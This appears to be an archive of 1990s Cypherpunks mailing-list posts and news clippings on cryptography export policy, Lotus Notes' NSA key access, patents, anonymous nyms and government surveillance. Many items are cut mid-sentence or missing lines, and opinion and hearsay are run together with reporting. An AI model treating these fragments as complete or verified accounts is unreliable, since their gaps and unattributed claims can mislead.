  President Clinton (I think it may all just be a good marketing scam :-).

The Christmas Troll
Hi all,
If you've never heard of the National Cryptologic Museum and have an
interest in this kind of stuff, you MUST go take a look.  It's at Fort
Meade, outside Laurel, Maryland, and actually lies on the grounds of the
NSA. I dropped by the other day and was very impressed.  The NSA is to be
grudgingly %^) commended, although the material on recent operations
(post-1950) is understandably a little thin.
The very coolest exhibit is a functioning Enigma machine on which visitors
are allowed to encrypt/decrypt messages. It really does work well, and I
got the same gloating thrill I felt the first time I decrypted a PGP
message from a friend. There is also a piece of Gary Powers' U2, a Cray
X-MP processor that you can sit on and peer into, several specimens of old
Japanese crypto machines, and incontrovertible proof of the Rosenbergs'
perfidy and treason, among many other interesting displays.  The staff is friendly and informative, but you will not get the current
key codes for ICBM launch control out of them, of course. I did not see
any mention of PGP or related topics in my brief visit, either. Oh, and
most surreal was the entrance: at the end of the road, an almost unmarked
gate a yard wide in a razor wire fence, dangling a padlock.  I wondered
for a moment if it were the right place and if I would be shot if I
actually went inside.
Allow half a day if you are a serious student of these topics, and an hour
or two if not. All in all, it was the second most interesting museum I saw
in Washington (after Air & Space). I still don't trust Clipper, but it was
certainly nice to see the human side of the big bad spooky NSA. They have
done an important job for the country and don't deserve most of the abuse
that I see heaped on them on the Internet.

I take some disagreement with that.
With patents, there is a problem of large companies owning them yet
doing nothing with them except suing other companies or individuals.
For example, look at arithmetic coding: there are many patents owned
on it, yet a lot of software using this means of compression may be in
violation of the patents... are the patent-owners publishing software
or makingh efforts to license it widely?  If anything, such patents
are getting in the way of using many algorithms.
Patents would be better if there was a good-faith attempt on the
part of the holder to "use it or lose it".  Somebody sitting on a

The Dream of the Internet Becomes Worst Nightmare
Manhasset, N.Y., Feb. 16 -- Technology managers, who
dreamed of the Internet as a new business tool and
championed their cause to senior management, are waking
up to nightmares of security gone awry, reports CMP's
InformationWeek in its February 19 issue.
"The incidence of cybercrook attacks to mine or sabotage
a company's information resources is rising rapidly,"
states Bob Violino, editor-at-large of InformationWeek.
"What is especially alarming is that despite the fact
that companies like Rockwell International and Merrill
Lynch and various government agencies employ the latest
firewall and encryption technology available, they are
experiencing security breaches on a regular basis."
Business users have been particularly skittish about the
Internet since last September, when two computer science
students at the University of California at Berkeley
cracked the public-key encryption code used by Netscape
Communications Corp.'s popular browser software.
"There are more experts than ever in the intruder
community who know the infrastructure of the Internet,"
explains Cathy Fithen, CERT's team leader of strategic
incident response.  "In the past we saw people breaking
into systems using passwords.  Now they look for flaws to
exploit involving networking protocols and source codes
for operating systems."
The fear of invasion is well founded, according to
federal law enforcement agencies, which have stepped up
their investigations of online intrusions.  "We're aware
that this is a serious problem for any industry using the
Internet," says Jim Freeman, special agent in charge of
the FBI's San Francisco office.
"Salvation from the government, or from vendors with new
security products, seems unlikely," says Violino.
"History shows that as soon as new security tools are
developed, hackers learn to crack them.  And while not
every company possesses trade secrets, security is still
a must for everyone in business.  For now, at least,
absolute security is one thing the Net can't offer."
But, companies are so focused on Internet intrusions from
outsiders that they often fail to consider the
possibility of an inside hacker.  According to John
Reinke, chief information security architect at Merrill
Lynch & Co., Inc. in New York, "There is no modern large
organization that I now of that does internal firewalls."
At Bell Laboratories, where an internal network links
some 300,000 host computers around the world, security is
a constant concern. "We're bigger than the entire
Internet was in the late 1980s," says Bill Cheswick,
technical staff manager at the labs' computer science
research department in Murray Hill, N.J.  "Our firewall
keeps the bad guys out but you can't say there aren't bad
guys inside the company."

@_subject: Piracy Bests ITAR 
The Economist, 17 Feb 1995, p. 17.
Should foreigners' intellectual property always be
protected? [Excerpts]
Is it right to expect governments, especially poor ones,
to honour new World Trade Organization rules on
intellectual property?
Some economists have made a good case that slack
enforcement of such rules may sometimes do little harm.
Local firms benefit by acquiring pirated technology more
cheaply than the real thing; consumers acquire affordable
high-tech products and close copies of branded goods.
Although the original producers of the intellectual
property lose out, it is sometimes hard to tell how much.
They might anyway have sold nothing in a poor country at
rich prices. And provided that counterfeiters make
reasonably faithful copies, piracy is free publicity: how
many Chinese would know about Microsoft's latest
programs, or listen to Michael Jackson's new album, had
they not been able to buy illegal imitations? ...
It is not always obvious what theft is. Much in patent
and copyright law is arbitrary. But who says American
copyright law is correct? More to the point, why should
China accept America's view of how a drug design, say,
should be accorded patent protection?
In some cases, the interests of rich and poor countries
are clearly at odds: one side has all the property. There
seems to be no objective standard to appeal to.
Eventually, this may change: as poor countries produce
more innovations themselves, their own inventors will
demand greater protection. Meanwhile, the lot of many
intellectual-property producers will not be a happy one.

Bullshit. Corporations do not work; their employees do. The
creativity of employees is sat upon as net worth, but nothing
is produced.  Money is only worth something if it is circulating
in an economy; a corporation only has worth if it produces
Instead corporations produce nothing.  They sit on resources,
preventing anyone else from producing, because the current system
favors non-production and an inflationary and wasteful economy
based on speculation.
Economic equivalent of people who sit around and talk but don't
get off their asses and do something.
No, they are not fundamental anything. They are taken for granted
in the modern West as a rationale. It's a nice one, and I don't
have too many arguments... except when people claim a false
dilemma of either total private property or total socialism.
Why not a form of property based on use?  If you don't use your
property, after a while you cease owning it.  It was originally
a rationale in Europe and early American colonies because so
many people claimed to own land that they never saw, despire the
fact that natives and settlers lived there.
Extended to patents... corporations do a lot of R but no D, but
legally no one else can make use of it either.  Unisys didn't
market LZW compression and let everyone else use it... then they
decided they should have been making losts of mulah and wanted
to pull the plug and get royalities.  IBM has done negligable
production on arithmetic coding, so a lot of independ developers
ignore the patents.  Similar arguments can be made about PK

@_subject: should we use same nym on multiple servers? 
With the additional nym servers coming on the scene comes the question of whether or not to "claim" our alpha.c2 nym on the other ones, too.  E.g., if we are foobar at alpha.c2.org, should we also become foobar at nym.gondolin.org and foobar at nym.alias.net, too?
  That would let us have a very stable nym, and prevent confusion over who's "who" if someone else were to have the same id with another nym server.  But, it makes it harder to keep our real ID secret.  (E.g., an oversimplified scenario would be if an attacker sends a message to all three nyms, then watches three PGP conventionally encrypted messages arrive in our mailbox.)
  A "safer" way would be to have the other two nyms have a fake address, but then we couldn't receive mail with it.  A trickier way would be to have the reply block point to alt.anonymous, but then we'd have to constantly be watching for a message "to" us.
  Another angle, though, is that the nym servers may be unstable, and multiple nyms would allow us to post, if out "favorite" is down.
  Anyways, I'm a beginner, and think that the most useful use of remailers is to ask dumb questions.  :-)

@_subject: \"Concryption\" 
Cambridge, MA, Jan 3 -- Security Dynamics plans to
license "Concryption," a just patented technology
combining encryption and compression, to outside
companies for use with a variety of security and
compression protocols, revealed Kenneth Weiss, chairman
and chief technical officer.  "It is my belief that Concryption will solve the two
biggest problems that exist today: the need for privacy
and more available bandwidth," Weiss said.  "Compression has been catching on. It takes less time
today to send a whole page of fax than it used to, for
example, and part of that is because of better data
compression. But encryption has not caught on in the way
it should, because of time and expense issues and the
hassles of key management."  Still, though, available bandwidth for data storage and
transmission is diminishing all the time, in arenas
ranging from fax to satellite technology, networked
information, and the World Wide Web, according to the
company chairman.  Compression will become an even more significant
requirement in the future, with an anticipated explosion
of multimedia applications, he predicted.  Security Dynamics has been awarded US Patent No.
5,479,512 for Concryption. The Cambridge,
Massachusetts-based company now holds a total of 14
patents from the US Patent Office, most related to its
"core business" of computer security, he reported.  One of the company's other patents, for instance, is for
a biometric technology designed to enable "voice
fingerprinting." Security Dynamics also produces the
SecureID Card, ACE/Server, and ACM series of user
authentication products.  Security Dynamics' newly patented Concryption technology
is based on mathematical synergies between the processes
of encrypting and compressing data. Both procedures call
for analyzing arrays of binary patterns, "seeing where
the spaces are," and then applying rules to the data.  Weiss added that encryption and compression are both
highly intensive in terms of CPU (central processor unit)
cycles and disk accesses. As a result, he asserted,
integrating the two technologies into a "single set of
operations" will bring cost reductions in CPU usage as
well as faster encryption times.  "The time to compress might increase a little bit, but on
the other hand, the time to encrypt goes to zero.
Whatever the disk accesses are for compression, there
would be no other disk accesses for encryption."  Security Dynamics sees Concryption as a "concept pattern"
suited to use with a variety of data types, network
transports, and security protocols, according to Weiss.
"This is a new enabling technology that we believe should
have an impact on the way information is communicated in
the future."  The company intends to work with outside licensees on
integrating different compression and encryption methods.
"Big users have already optimized compression for their
unique technologies. We use a different form of
compression for fax than we would for satellite data or
TV pictures. Beyond that, companies might employ
different compression algorithms. Similarly, people like
to have control over the type of encryption used," Weiss
maintained.  Although forthcoming multimedia applications will require
much greater compression than text, conventional needs
for "privacy" may not be as high, since many video
offerings of the future will be geared to entertainment,
Weiss acknowledged.  "But we will probably be seeing 'economic privacy,' " the
company chairman noted, pointing to a trend, already well
established in the cable TV industry, toward providing
"high demand" fare such as first-run movies only on
separately priced, encrypted, "premium channels."  Contact: Security Dynamics, 617-547-7820

What does a hotel do, if not act as a local communication

installations? Most PBX's have for years supported the
facility to handle entirely separate groups of trunks, often
called "tenants." This facility is used in shared-receptionist,
shared-PBX scenarios. Each incoming trunk call identifies the
"tenant" or company to which the call is addressed, so the
receptionist may answer appropriately. I even seem to vaguely
remember hearing of apartments or co-ops that use a PBX
instead of having direct subscriber lines to each apartment. Aggregation of communication facilities within the boundaries
of public rights of way seems to be a long-standing practice,
at least in the voice field. Voice and data are increasingly
indistinguishable, the latest move in that direction being the
practice of supporting a PBX with all-ISDN trunks.
I have to think there is something in the way you have gone

Jerusalem, (Reuter) - The head of Israel's Shin Bet
resigned Monday just three days after the killing of a

Yitzhak Rabin.
The man, identified by his initial "kaf," remains in

His predecessor, Yaacov Peri, is now president of one of
Israel's two cellular telephone networks.  8 Jan 1996
Jerusalem (AP) -- The booby-trapped cellular phone that
killed an Islamic militant was delivered by a longtime
informer for Israel who was paid $1 million for helping,
media reports said Monday. A fugitive for three years, Ayyash was hiding in the home
of Osama Hamad, his friend from college days.  Hamad said
he warned Ayyash in the summer that his uncle, Kamal
Hamad, may be an informer for Israel.  Hamad said his uncle gave him a cellular phone so he
could be found easily.  A day before Ayyash was killed, his uncle asked for the cellular phone, took it and returned it later, requesting
that it be kept on at all times, Hamad said.  Israel's security services apparently deceived Kamal
Hamad, telling him they had planted a bug in the phone,
rather than explosives, the radio said.  Media reports said that the explosion was set off by
remote control when Ayyash answered a call to him. It is
not known how the identity of Ayyash was ascertained.

Global Internet Wins NSA Contract for Windows NT Security
Feasibility Study to Analyze B-Level Security
Palo Alto, Calif., Jan. 8 -- Global Internet today
announced that the National Security Agency has awarded
them a contract to conduct a feasibility study on raising
the security level of Windows NT 3.51 to B-level.  Global
Internet will analyze Windows NT's ability to meet
B-level security requirements, as well as develop a
software prototype that demonstrates a Fortezza-based
cryptocard access control mechanism.
The contract was granted by the NSA under the Multilevel
Information System Security Initiative (MISSI), which has
the charter to provide security services for information
ranging from Unclassified but Sensitive up to and
including Top Secret.  Windows NT was originally designed
with security in mind.  A NSA evaluation team has
determined that Windows NT 3.5 with Service Pack 3
satisfies all class C-2 security requirements.  B-level
of security strengthens the C2 level security features
while providing stricter system assurances.
Global Internet has a proven expertise with Windows NT. Centri TNT is the only network security solution that is
fully integrated into Windows NT TCP/IP networks by
complementing and extending Windows NT's inherent
strengths, while maintaining 100% compatibility with
existing applications.  Global Internet also has
extensive experience architecting, designing and
developing high level secure operating systems.
"This project addresses anticipated security requirements
for DOD, as well as commercial customers using Windows

Internet Software Group.  "Our analysis will address
compatibility issues with B-level security requirements
and identify the changes necessary to provide this level
of support."
According to Outlink, Inc., a New York-based research and
publishing firm focusing on the information security
market, about 80% of the PC hardware market supports
Microsoft's DOS and Windows 3.1.  This combination,
though popular, does not provide inherent security
features such as secure login, access control, auditing
and self-protection. Strong access control is a highly
desirable function of the MISSI architecture.  Trusted
Operating Systems will play a role in the MISSI success.
Windows NT is a modular OS and combined with its current
security features that are based on the Trusted Products
Evaluation Program (TPEP) C2 level of security and it's
ability to operate on the majority of customer platforms
while supporting DOS and Windows applications, the
architecture lends itself to support B-level
An operating system with few security features allows
anyone to use the machine without validating their
identity, while allowing access to all files, objects and
resources.  C2 level security includes: auditing to allow
security-relevant events to be recorded and monitored,
discretionary (need-to-know) access controls to mediate
who can access (read or write) files and other objects
and identification and authentication (login) to require
users to identify themselves to the system before they
are allowed to use the system.
B-level security additionally includes: labeling of
users, files and other objects with a sensitivity label,
mandatory access controls to enforce a security policy
based on the labels of the users and objects and trusted
path that ensures users they are using the actual
programs provided with the system.

Scientific-Atlanta Licenses Cylink's Security Techniques
for Digital Broadband Application
First Use of Patented Cylink Public Key Methods by a
Digital Set-Top Terminal Supplier for Two-Way Message
Encryption, Decryption and Authentication
Atlanta, Jan. 9 -- Scientific-Atlanta, Inc. announced
today the licensing from Cylink Corporation of
communications security techniques for use by cable and
other broadband television systems.
Cylink, a provider of enterprise-wide network information
security products and wireless communications, has
licensed to Scientific-Atlanta what are known as the
"Stanford patents," which cover the field of public key
cryptography, a security technique that ensures privacy,
authentication and integrity of electronic information.
The license gives Scientific-Atlanta the right to
practice public key cryptography methods, as defined in
certain intellectual property holdings of Cylink.  These
include methods for generation, authentication and
exchange of "public keys" used in securely communicating
point-to-point network messages.  Scientific-Atlanta
plans to use these cryptography techniques in its
development of a conditional access system for digital
networks -- including set-top terminals, headend
components, and network element management software -- to
improve communications security for digital pay-per-view,
cable modems and other broadcast and interactive
The license is the first that Cylink has granted to a
set-top terminal manufacturer of its patented
cryptographic techniques.  No other terms were disclosed.
With sophisticated encryption systems, cable and other
broadband network operators can be more flexible in
implementing new services that employ easy-to-use
security.  For example, both content providers and the
network operator can have a secure way of interactive
communications with subscribers.  Sensitive information,
such as credit card numbers, can be encrypted and
exchanged. The identity of the sender and the message
content can be authenticated -- an important capability
for multi-provider authorization environments and for
validation of orders from subscribers.
A public key-based cryptography system controls the
encryption and decryption of messages.  Each user is
assigned two unique mathematically-related keys: a
published public key, and a secret private key.  In a
cable TV environment, the public key for each
subscriber's set-top terminal can be distributed or
"published" while keeping the private key in secure
"We're excited about the opportunities this license opens
for content providers and network operators," said Bob

digital subscriber systems.  "With Cylink's innovations,
we have the foundation necessary for designing very
advanced security into any digital broadband application,
including pay-per-view, cable modems and electronic

Digital's Samuel H. Fuller, VP of corporate research for Digital, and Alan Jennings, Digital's manager of advanced technology business development, also told Newsbytes that Alta Vista has "re-started its Web crawling," to add even more pages to the total of 60 million Web pages -- representing half of all pages on the Web -- that were already indexed by December 15, when the new "super spider" Web facility opened to the public.  "And as Alta Vista took off as the fastest growing Web site, we have quadrupled the capacity of our AlphaServer 8400 system from two to eight processors, and doubled the memory," noted Fuller.  This leaves a "factor of two headroom" in terms of both processing power and memory, meaning that a single 8400 system should be able to host and accommodate an index for the entire Web, the VP added. The Alta Vista site also uses a smaller Alpha server to house the "super spider" itself.  As reported in Newsbytes on December 15, Jennings previously said that Alta Vista is able to search up to 2.5 million Web pages a day. Lycos, Alta Vista's closest competitor, had searched only 7 million Web pages up to that time, and the World Wide Web Worm about 3 million Web pages, in comparison to Alta Vista's 60 million pages, Newsbytes was told.  Alta Vista's high search speeds are made possible by the ability of the super spider to algorithmically "breed" batches of smaller Web crawlers, together with the use of Alpha processing power and high-speed ATM (asynchronous transfer mode) networks, according to Jennings.  Fuller and Jennings told Newsbytes this week that Digital is currently assessing Alta Vista usage patterns and the half dozen- or-so "business inquiries" received each day to decide where to take Alta Vista on a commercial basis.  On Friday, December 15, Alta Vista received 300,000 hits, a number that grew to 600,000 on Monday, December 18, 1.5 million by Wednesday, December 20, and 2 million per day following the December holidays, according to Fuller.  In earlier beta testing, some 10,000 users employed Alta Vista to look up references to themselves and their families, to locate old friends and college roommates, and to access market research, information about the Web, and facts about corporate travel destinations.  Like their counterparts within Digital, many Web users among the public at large have been employing Alta Vista for genealogically search purposes, Jennings said.  Alta Vista is also emerging as "a real solid research tool covering the breadth of the Web," he asserted. In addition to obtaining an index of all Web sites containing a specified search term, and being able to move to those sites through hotlinks, users can obtain "reasonably good information regarding the characteristics of Web sites," such as "how frequently (the sites) are referenced, and the number of pointers."  You can also employ can also employ case-sensitive matches, and limit searches to titles or other specified sections of a document.  Digital officials have been impressed by Web users' "ingenuity" in inventing applications for Alta Vista. One company, for example, wanted to get in touch with all other firms with links to its site, he illustrated.  Upon learning that Alta Vista is able to search for URLs (user resource locators), or pointers, the user conducted a URL search, and then proceeded to send out a broadcast e-mail message over the Internet to all linked sites.  Business inquiries, he reported, have fallen into three main categories: users who want to use Alta Vista internally, license the search engine, or advertise their goods and services on the Alta Vista home page.  "We'll start to make decisions on these within the next 30 days, and by the end of the quarter, (the decisions) will be part of our general business plans," Jennings told Newsbytes.  "Digital is inching toward decisions on what they're going to do," pointed out Jim Green, an analyst at Summit Strategies.  "Clearly, this Web site has met with astounding success. Alta Vista lets you start to make sense of the Internet. It makes you think about exactly what you want, because it will give you everything," the analyst told Newsbytes.  "I see Alta Vista as a very useful tool for competitive analysis," observed Greg Kline, director, Network Integration and Management Research, at the Business Research Group (BRG).  "I think that as Digital gets closer to finalizing their plans, they'll be speaking more about Alta Vista's most sophisticated search capabilities. And as Web servers become the corporate infrastructure through the "IntraNet,' users will be seeing the need for a tool to index their information assets," Kline told Newsbytes.

Ozzie Outlines New Feature At RSA Data Security
San Francisco, Jan. 17 -- Ray Ozzie, president of Iris
Associates, the developer of Lotus Notes, informed an
audience at the RSA Data Security Conference here today
that Notes Release 4, which began shipping this month,
utilizes a new method of security called "differential
workfactor cryptography." This new method allows the
International Edition of Notes to use an encryption key
equal in strength to the 64-bit key in the North American
Edition, without the use of "key escrow" technologies.
Ozzie explained that in the International Edition of
Lotus Notes Release 4, whenever an encrypted 64-bit bulk
data key is generated by the product, it is bound to a
"workfactor reduction field," giving the U.S. government
exclusive access to 24 of the 64 bits.  When using the
North American Edition of Lotus Notes within the U.S. and
Canada, however, full 64-bit encryption is employed
without the "workfactor reduction field."  The two
editions of Notes are fully interoperable.
"We are very pleased to have arrived at a pragmatic
short-term solution that addresses our international
customers' requests for greater security within Notes,"
Ozzie said.  "However, we continue to argue vigorously
that, due to clear and present threats to our global
information systems, all interests would be well served
by widespread use of strong, high-grade cryptography. Without substantial rethinking of U.S. cryptography
policy, particularly as it pertains to export controls,
our global and national economic security is at risk."

IBM Compromises on Encryption Keys, U.S. Allows Export of
More-Secure Notes
By Thomas E. Weber
New York -- International Business Machines Corp., caving in
to intense government pressure, agreed to include a special
key that helps investigators tap into data messages in return
for permission to export a more-secure version of its Lotus
Notes software.
The U.S. has prevented software makers from exporting
sophisticated encryption technology for fear that terrorists
and other criminals would gain access to a snoop-proof
communications system. Industry observers said IBM's move
marked the first time a supplier agreed to give the government
special access to its software's security code.
Encryption keys have stirred the concern of privacy experts in
the past. While IBM's Lotus Development Corp. software unit
defended the move as a stopgap compromise until a broader
agreement on data security can be reached, Notes creator Ray
Ozzie clearly found the controversial plan somewhat
"We were desperate enough to try to negotiate a short-term,
pragmatic solution," Mr. Ozzie said. "But we do not believe
this is the right long-term solution."
One privacy advocate would agree. "The irreducible fact is
that foreign customers are reluctant to rely on security
products that have been compromised in some way" by federal
intelligence agencies, said Mike Godwin, staff counsel for the
Electronic Frontier Foundation.
Several years ago the government proposed the "Clipper"
computer chip that was programmed to let investigators tap
into phone calls and data messages transmitted digitally.
While that plan died after privacy advocates accused the
government of trying to spy on users, the idea of leaving a
back door open for government agents has remained alive.
Under the Lotus plan, government investigators would still
need to employ sophisticated code breaking to read messages
sent via Notes software, which lets users at different
computers collaborate. Security software encrypts information
by using a unique key of software code. The length of a key is
measured in computer bits, and longer keys are better --
they're more complex and more difficult for would-be spies,
not to mention government agents, to unravel.
Until now, to obtain an export license for Notes, Lotus has
been restricted to an encryption system of 40 bits in its
international version. Domestic users have been permitted to
use a higher-level, more-secure 64-bit system.
The new overseas version of Notes, tagged Release 4, will give
foreign users 64-bit security. But to get permission to export
the software, Lotus agreed to give the government access to 24
of those bits by using a special 24-bit key supplied by the
National Security Agency.
The plan effectively gives the government a headstart in
trying to break the encryption scheme. With 24 bits of the key
already in hand, the government need only crack the remaining
40 bits -- a task considered trivial for the code-masters at
the NSA. As far as the U.S. government is concerned, this
version of Notes is no more difficult to crack than the
previous one.
The advantage to customers, Mr. Ozzie said, is that anyone
other than the U.S. government -- say, a malevolent criminal
or computer hacker -- would face the more daunting task of
breaking the 64-bit key.
Mr. Ozzie said the move was a response to complaints from
foreign purchasers of Notes. "Our customers have been telling
us that, unless we did something about the security, we could
no longer call it a secure system," Mr. Ozzie said.
It remains to be seen whether Lotus's move will allow it to
sell more software. "The idea is a good stopgap measure," said
Stephen Franco, an analyst at Yankee Group in Boston. "But the
most important thing is pushing the U.S. government to relax
some of its restrictions" on exports.

@_subject: Junk Notes 
New York (AP) -- For the first time in years, there were
no major trouble spots in IBM's vast product line. Both
personal computers and large systems sold well and Lotus
Development Corp., which IBM acquired last summer,
shipped an astounding 1.2 million copies of its Notes
program. "Our fundamental strategies are working," IBM
chief executive Louis V. Gerstner Jr. said in a
statement.  ...
Changes in the general export laws seemed unlikely so
Lotus negotiated an interim solution. "This protects
corporate information from malicious crackers but permits the government to retain their current
access," Ozzie said.
Simson Garfinkel, author and computer security expert,
said he's not sure international buyers of Notes will
like the solution. "Foreign companies don't want the U.S.
government to spy on their data any more than the U.S.
government wants foreign companies to be able to spy on
theirs," Garfinkel said.  ...
But IBM said nothing about the future, causing some
nervousness among the investors who have seen other
technology companies project a flat performance in the
next few months. "It was a good quarter but the bad news
is we've got to go and find out what's going to happen in
1996," said David Wu, analyst at Chicago Corp.  Questions have been raised about the timing of IBM's June
acquisition of Lotus -- a $3.5 billion deal that was the software industry's largest ever -- because World Wide
Web-related programs seemed to be eclipsing the need for
Lotus' Notes, a communications and database program.

"...the same article had Madsen stating that the NSA is     vacuuming down Internet traffic. he gave the likely entry     points that they are doing this."
It's a virtual lead-pipe cinch that this is being done and
probably has been going on for longer than anyone would like to In the 1960's - 1970's when international cable traffic was in its computer infancy, access was had to EVERY CABLE MESSAGE passing through the message switches of U.S. common carriers.
This means no only every international cable message originating from or destined to a U.S. point, but also included every message ROUTED THROUGH the U.S., such as Europe <--> South America. There was no great skullduggery involved -- the common carriers simply made copies of their own log tapes and handed them to messengers from the, ah, FCC (ahem). It was on the operations checklist and no one thought twice about it. It may be urban legend to some, but I've seen it with my own eyes, handled the tapes with my own hands. If anyone else wishes to move this from the status of urban legend to something more solid, all they have to do is locate and ask people who worked in message switch operations at RCA Global Communications, ITT World Communications, or Western Union International, the three common carriers of that time.
Knowing this, I would assume something similar was done at overseas locations of the same carriers and at such other access points as could be compromised. An organization such as NSA that viewed this as SOP would have to be brain dead not to be doing
the same thing with the Internet. The only question in my mind is how far they have gone beyond USENET and the newer, fertile ground of web sites. Are they vacuuming packets and reassembling email? Just how many laser discs have been filled with coherent Time to exercise those plain, brown envelopes.

I can see it now... about the time that Grandson of Altavista finally yields a URL for Jimmy Hoffa's body in some dump somewhere the government will have figured out that it's so much simpler to catalog the stuff on the way IN, when all the artifacts are fresh and unmixed. While we're all watching what the government does to intercept packets, they will be routing *trash* packets through mysterious "garbage routers."  As the stink grows stronger, someone will conceive of anonymous trash forwarders. They will accept unidentified trash, no questions asked, anonymize it with random DNA and fingerprint whorls, and sneak it into public trash receptacles. DNA generators will enable the mischievous to plant fabricated indications that Hillary did indeed have something going with Vince, the late Khomeini (hey, hard is hard, right?) as well as legions of four-footed friends, confirming the suspicions of As the piles of trash-based data grow, some Senator from
Nebraska will sound the alarm that kids are too easily exposed
to the indecent signs of private behavior retrievable on the
Net and will propose draconian measures to hold everyone
responsible for their contributions to the city landfill. Public receptacles will be closed. Trash will only be collected from registered Identifed Surplus Providers (ISP's). $250,000 fine for disposing of a condom in a dump accessible from the Internet... 10 years in prison for carelessly tossing those nasty Polaroids in the kitchen compactor. The trash of the world
will have to be made safe for kids to view.
Everything will be a lot easier to trace and control if the
garbage input is fully identified. Barcodes on trash bags
might do for starters. Access to the garbage system might have
to be restricted to those 18 and over. Trash collectors could
be made responsible for content, drafting them without pay into
the ranks of the trash police. People could be encouraged to
report suspicious trash, and trash-related activities like
neighbors sneaking out at night to place an innocent-looking
compactor bag down the block with someone else's trash.  For their own protection, youngsters might be required to retain all their garbage until age 18 and then, in a solemn ceremony worthy of the true significance of coming of age, pitch it all (duly anonymized to prevent abuse of minor indiscretions) from their new position as lawful participants in the world garbage system, friends and well-wishers trying to applaud and hold their noses at the same time (try it -- if you're not careful you can break your own nose, but hey, that'll work, too!). Who knows? Maybe Heinlein's advocacy of keeping kids in a barrel and feeding them through a hole until age 18 will enjoy resurgence among the compulsively protective while the Web meanwhile will provide real time underground data on Heinlein's rpm rate.
Protecting the trash of youth will, however, give rise to the hiding of adult trash among that of the underaged. The government
will have to root out offenders and "impute" suspicious trash to the parents. Those with no visible source of trash will of course be suspect, and will have to emit innocent trash to cover themselves. This will give rise to the practice of "trash laundering," in which agents convert nasty trash to innocuous trash that may then be tossed into any monitored, controlled channels with no repercussions.
Trash laundering will become a grave offense to the accompaniment of government and Ad Council PSA's and free brochures from Pueblo, Colorado. Blatant offenders who have fled to foreign climes will be kidnapped, some will be tortured,
because the War Against Filth will be a moral commitment of the national body. Foreign governments headed by suspected trash traffickers will be toppled in quickie invasions, their leaders brought back in chains to disappear into federal dungeons. Public debate will center on the legalities and rationalizations of using the military in policing domestic trash, while agencies such as the FBI cry for more budget to fight the scourge that threatens the decency of the nation's repositories.
Control of trash will spread inevitably to control of liquid wastes, whereupon a terrible discovery will be made: Everyone, but everyone, emits unspeakable bodily products. At that point the government will have no choice but to reluctantly declare everyone an outlaw and execute the populace.
It's all as logical as what happens when you introduce division by zero way down at the bottom of the complex equation where it isn't so noticeable.

@_subject: New China Ruling Threatens Closure Of News Agencies 01/19/96 
In effect, the edict puts Xinhua, the world's unnewsiest news agency, in charge of agencies normally beyond the grasp of cadre communists -- even in Hong Kong, Macau and, Taiwan. On this basis, the next time Hong Kong billionaire Li Ka-shing did a deal with state authorities that relieved McDonald's Corp. or any other legal entity of its contractual rights (as happened last year), the story would have to be vetted by Xinhua.  Xinhua already made information-control history when it established a service that both disseminates outgoing commercial data on the Internet and filters any incoming information.  Although the State Council's directive gives Xinhua control over strictly "economic" news, the government body has licensed Xinhua to control everything, effectively ruling out reliable news. Stock markets and business plans are driven by market forces -- even in highly manipulated China. Even when one is tempted to think business is market driven, the whims of China's central controllers can skew everything -- as merchandisers in the casual wear clothing market found when that suddenly dried up because the bosses on top didn't like then Giordano clothing store chairman Jimmy Lai.  The State Council's directive will in all likelihood force the New York Times, Reuters and other news organizations to reassess their operations in territories Xinhua is authorized to control.  Controls go beyond editorial conventions. According to Xinhua, foreign wire services will not be allowed to increase subscribers in China "directly nor by ways of establishing joint ventures, solely funded companies or agents."  The Xinhua report said that foreign news providers "will be punished in accordance with the law if their released information to Chinese users contains anything forbidden by Chinese laws and regulations, or slanders or jeopardizes the national interests of China."  Jeopardizing the national interest of China is now taken to mean jeopardizing the interests of the communist party, or the roughly 5% of the population controlling the country from "the barrel of a gun," to borrow from Mao Zedong.  Agencies only learned of the new rules Tuesday night when Xinhua, skirting the usual practice of circulating advisories on operational changes internally, simply put the story on the wire. One Hong Kong agency man told Newsbytes: "We always knew writing stories from China was a problem. Now you have to wonder if we'll be able to send stories from Hong Kong, without having to pass them by Xinhua for approval.  The directive indicates stories will have to pass through Xinhua first -- pointing to a major evacuation of news services, and technology vendors who handle them.  (Nigel Armstrong & I.T.

Fellow Cypherpunks,
I have been lurking around for some time and I have learned alot, But I have
a few questions that I either haven't seen posted or I've missed all together.
I keep PGP stored on a removable hard drive and keep it under lock and
key when it's not in use.  I write and encrypt messages on a stand-alone
that I only have access to. My passphrase is rather long and full of gibberish,
But I still fear the other things that I can not control.
Does anyone make and sell a device that emits white and pink noise?
How do you take the randomness collected from radation sensors to create
a truly random sample for creating a PGP key?
Is there anything else that I might be missing besides lining the walls &
computer in tin foil?   :^) Thanks for your help!

U.S. Hid Weapons In Austria
Vienna, Austria, Jan 21 (AP) -- Fearful of a Soviet
takeover after World War II, the United States hid at
least 79 weapons caches in Austria for anti-communist
According to the newspaper Kurier, a U.S. congressional
committee monitoring CIA activities found documents on
the weapons caches that had not been known to the Clinton
administration.  A report Saturday in the Boston Globe prompted Hunt to
inform the Austrian government, Kurier said.
The Boston Globe report said CIA agents stashed the
weapons while the U.S. military conducted loud military
However, Fritz Molden, a former Austrian journalist, said
Sunday that the secret weapons depots were established at
the initiative of the Austrian government led by
Chancellor Leopold Figl, and planning for them began in
1948. He claimed that some depots were also placed in the
Soviet occupation zone in eastern Austria.
Molden told the APA he had acted as a liaison between the
Americans and the postwar Austrian government. However,
it was not clear why the information was not handed down
to subsequent governments.
Austria demands details on secret US arms depots
Vienna, Austria, Jan. 21 (Reuter) -- Austria's leadership
Sunday demanded the United States supply details of 79
secret U.S. arsenals scattered across Austria.
"The Americans should give us a plan indicating where the
weapons depots are, how serious they have to be taken and
what dangers they pose," Chancellor Franz Vranitzky said. Speaking on television Sunday, Vranitzky cautiously indicated the possibility of secret stockpiles from the
other occupation forces -- France, Britain and the Soviet
"Approaching the other three occupation powers and asking
them whether they too still have secret depots on
Austrian soil will be dealt with in a very pragmatic and
sensible way," Vranitzky said.
The chancellery said the U.S. government was working on
an exact list detailing the locations of the depots, and
U.S. Ambassador Hunt promised to furnish details as
quickly as possible.  The television said experts assume each of the arsenals contained sufficient weapons and explosives for 150 anti-communist guerrillas and could also contain
significant amounts of gold.  Austrian television said that while the U.S. foreign ministry had assured Austria it would act as soon as
possible, the CIA, which alone knows the exact locations
of the arsenals, has remained silent on the issue.
Postwar leaders acted with U.S. on arms caches
Vienna, Austria, Jan. 22 (Reuter) - Austria's postwar
leaders cooperated with the United States to stockpile
arms around the country in a top-secret operation to
safeguard against a Soviet attack, an ex-resistance
fighter said Monday.
Fritz Molden, who acted as a liaison officer between the resistance and the allied powers, said that if the
Kremlin had discovered the plan to organize an
